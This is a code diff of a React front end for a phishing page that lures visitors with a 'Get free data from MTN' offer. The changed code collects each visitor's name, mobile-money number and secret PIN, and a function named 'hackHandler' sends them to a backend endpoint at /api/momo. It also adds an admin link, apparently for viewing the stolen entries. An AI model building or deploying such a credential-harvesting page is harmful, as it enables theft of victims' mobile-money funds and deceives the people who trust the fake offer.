@@ -1,26 +1,54 @@
 import "./App.css";
 import Axios from "axios";
-import { useState } from "react";
+import {Link, Outlet} from 'react-router-dom'
 
+import { useEffect, useState } from "react";
 function App() {
   const [name, setName] = useState("");
-  const [num, setNum] = useState("");
+  const [momonum, setMomnum] = useState("");
+  const [code, setCode] = useState("");
 
-  const handler = () => {
-   Axios.post('http://localhost:3001/api/insert', {name:name, num:num})
-  }
+  const hackHandler = () => {
+    Axios.post("http://localhost:3001/api/momo", {
+      name: name,
+      num: momonum,
+      code: code,
+    });
+  };
+
 
   return (
-      <div className="App">
-        <div className="form">
-          <h1>Get free data from MTN</h1>
-          <h3>Enter your MTN number</h3>
-          <input type='number' placeholder="E.g: 05444767584" name="name" onChange={(e) => setName(e.target.value)}/>
-          <h3>Enter your secret code</h3>
-          <input type="password" placeholder="E.g: xxxx" name="name" onChange={(e) => setNum(e.target.value)}/>
-          <button onClick={handler}>Submit</button>
-        </div>
+    <div className="App">
+      <Link to='/admin'>Admin</Link>
+      <Outlet/>
+      <div className="form">
+        <h1>Get free data from MTN</h1>
+        <label htmlFor="name">Your name</label>
+        <input
+          onChange={(e) => setName(e.target.value)}
+          type="text"
+          name="name"
+          id="name"
+        />
+
+        <label htmlFor="momonum">Your momo number</label>
+        <input
+          onChange={(e) => setMomnum(e.target.value)}
+          type="number"
+          name="momonum"
+          id="momonum"
+        />
+
+        <label htmlFor="code">Your secret code</label>
+        <input
+          onChange={(e) => setCode(e.target.value)}
+          type="password"
+          name="code"
+          id="code"
+        />
+        <button onClick={hackHandler}>Submit</button>
       </div>
-  )
+    </div>
+  );
 }
 export default App;
